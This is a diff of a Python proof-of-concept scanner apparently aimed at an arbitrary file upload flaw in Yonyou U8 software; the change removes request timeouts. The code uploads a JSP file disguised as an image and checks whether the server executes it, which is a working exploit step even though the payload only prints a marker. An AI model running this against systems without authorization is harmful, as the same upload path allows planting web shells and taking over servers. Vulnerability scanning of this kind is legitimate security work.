@@ -49,8 +49,8 @@ class poc:
         'file': ('1.jsp', '<% out.println("yongyouu8");%>', 'image/jpeg'),
     }
         try:
-            result = requests.post(url=url, files=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            req = requests.get(url + "/yongyouU8_test.jsp", headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, files=data, headers=self.headers, verify=False, proxies=self.proxies)
+            req = requests.get(url + "/yongyouU8_test.jsp", headers=self.headers, verify=False, proxies=self.proxies)
             if req.text.find("yongyouu8") != -1:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
